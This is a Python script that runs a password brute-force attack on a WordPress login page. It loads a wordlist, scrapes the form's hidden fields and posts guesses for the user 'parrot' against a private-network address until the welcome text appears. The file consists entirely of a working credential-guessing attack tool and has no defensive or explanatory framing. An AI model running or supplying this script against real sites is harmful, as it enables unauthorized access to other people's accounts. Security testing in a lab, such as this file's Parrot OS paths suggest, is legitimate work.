from io import BytesIO
from lxml import etree
from queue import Queue
import requests
import threading
import time

SUCCESS = "Welcome to WordPress!"
TARGET = "http://10.0.0.70:8080/wp-login.php"
WORDLIST = "/home/parrot/Downloads/cain-and-abel.txt"
THREADS = 1

def get_words():
    with open(WORDLIST) as file:
        raw_words = file.read()

    words = Queue()
    for word in raw_words.split():
        words.put(word)
    
    return words

def get_params(content):
    params = dict()
    parser = etree.HTMLParser()
    tree = etree.parse(BytesIO(content), parser=parser)

    for element in tree.findall("//input"):
        name = element.get("name")
        if name is not None:
            params[name] = element.get("value", None)

    return params


class Bruter:
    def __init__(self, username, url):
        self.username = username
        self.url = url
        self.found = False
        print(f"\nBruto Force Attack beginning on {url}.")
        print("Finished the setup where username = %s\n" % username)

    def run_bruteforce(self, passwords):
        for _ in range(THREADS):
            thread = threading.Thread(target=self.web_bruter, args=(passwords,))
            thread.start()

    def web_bruter(self, passwords: Queue):
        session = requests.Session()
        response_0 = session.get(self.url)
        params = get_params(response_0.content)
        params["log"] = self.username
        headers = {
            "Content-Type": "application/x-www-form-urlencoded"
        }

        while not passwords.empty():
            time.sleep(5)
            password = passwords.get()
            print(f"Trying username/password {self.username}/{password:<10}")
            params["pwd"] = password
            response_1 = session.post(self.url, headers=headers, data=params)

            if SUCCESS in response_1.content.decode():
                self.found = True
                print("\nBruteforcing successful.")
                print("Username is %s" % self.username)
                print("Password is %s\n" % password)
                print("done: now cleaning up other threads ...")

def main():
    words = get_words()
    bruter = Bruter('parrot', TARGET)
    bruter.run_bruteforce(words)

if __name__ == "__main__":
    main()